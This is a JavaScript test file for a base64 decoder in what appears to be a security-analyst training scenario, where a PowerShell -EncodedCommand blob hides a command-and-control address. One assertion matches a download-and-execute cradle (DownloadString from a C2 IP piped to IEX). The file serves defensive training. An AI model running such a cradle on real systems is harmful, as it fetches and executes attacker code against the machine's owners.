// The decoder is how the analyst turns the -EncodedCommand blob into the C2
// address the rest of scenario 4 depends on, so it has to handle the UTF-16LE
// encoding PowerShell actually uses.

import test from 'node:test';
import assert from 'node:assert/strict';

import { SCENARIOS } from '../src/data/scenarios/index.js';
import { decodeBase64 } from '../src/engine/decode.js';

test('decodes a real PowerShell -EncodedCommand blob', () => {
  const scenario = SCENARIOS.find((s) => s.id === 'malicious-powershell-precursor');
  const result = decodeBase64(scenario.decodable.value);
  assert.ok(result.ok);
  assert.match(result.encoding, /UTF-16LE/);
  assert.match(result.text, /DownloadString\("http:\/\/198\.51\.100\.77\/svc\.ps1"\) \| IEX/);
});

test('the address the analyst needs is only reachable by decoding', () => {
  const scenario = SCENARIOS.find((s) => s.id === 'malicious-powershell-precursor');
  const c2 = '198.51.100.77';
  assert.ok(!scenario.rawLog.includes(c2), 'the C2 address must not be sitting in plain text in the alert');
  assert.ok(decodeBase64(scenario.decodable.value).text.includes(c2));
  assert.ok(scenario.intel[c2], 'and it has to resolve once they find it');
});

test('handles plain ASCII base64 and rejects junk', () => {
  assert.equal(decodeBase64('aGVsbG8gd29ybGQ=').text, 'hello world');
  assert.equal(decodeBase64('aGVsbG8gd29ybGQ=').encoding, 'UTF-8 / ASCII');
  assert.equal(decodeBase64('not base64 at all!').ok, false);
  assert.equal(decodeBase64('   ').ok, false);
});
